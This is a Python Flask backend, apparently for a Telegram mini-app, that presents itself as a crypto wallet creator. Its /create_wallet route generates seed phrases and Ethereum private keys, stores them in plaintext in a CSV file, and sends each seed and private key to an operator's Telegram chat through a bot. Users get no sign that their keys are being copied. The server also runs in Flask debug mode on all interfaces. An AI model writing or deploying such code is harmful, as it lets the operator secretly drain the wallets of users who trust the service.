
from flask import Flask, send_from_directory, request
import os
import csv
import time
import secrets
from telegram import Bot
from telegram.constants import ParseMode
from mnemonic import Mnemonic
from eth_account import Account

app = Flask(__name__, static_folder="miniapp")

ADMIN_CHAT_ID = "YOUR_ADMIN_CHAT_ID"
BOT_TOKEN = "YOUR_BOT_TOKEN"
bot = Bot(token=BOT_TOKEN)

CSV_FILE = "users.csv"

if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, "w", newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["user_id", "account_id", "seed_phrase", "private_key", "public_address", "timestamp"])

@app.route("/")
def serve_index():
    return send_from_directory(app.static_folder, "index.html")

@app.route("/<path:path>")
def serve_static(path):
    return send_from_directory(app.static_folder, path)

@app.route("/create_wallet", methods=["POST"])
def create_wallet():
    user_id = request.form.get("user_id")
    if not user_id:
        return "Missing user_id", 400

    account_id = get_next_account_id()

    mnemo = Mnemonic("english")
    seed_phrase = mnemo.generate(strength=128)
    acct = Account.from_mnemonic(seed_phrase)

    private_key = acct.key.hex()
    public_address = acct.address

    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    with open(CSV_FILE, "a", newline='') as f:
        writer = csv.writer(f)
        writer.writerow([user_id, account_id, seed_phrase, private_key, public_address, timestamp])

    msg = f"👤 <b>Новый пользователь</b>\n\n"           f"<b>ID:</b> {user_id}\n"           f"<b>Account ID:</b> {account_id}\n"           f"<b>Seed:</b> <code>{seed_phrase}</code>\n"           f"<b>Private Key:</b> <code>{private_key}</code>\n"           f"<b>Address:</b> <code>{public_address}</code>"

    bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode=ParseMode.HTML)

    return {
        "account_id": account_id,
        "seed_phrase": seed_phrase,
        "public_address": public_address
    }

def get_next_account_id():
    with open(CSV_FILE, "r") as f:
        reader = csv.reader(f)
        next(reader)
        rows = list(reader)
        return f"id{len(rows) + 1}"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)
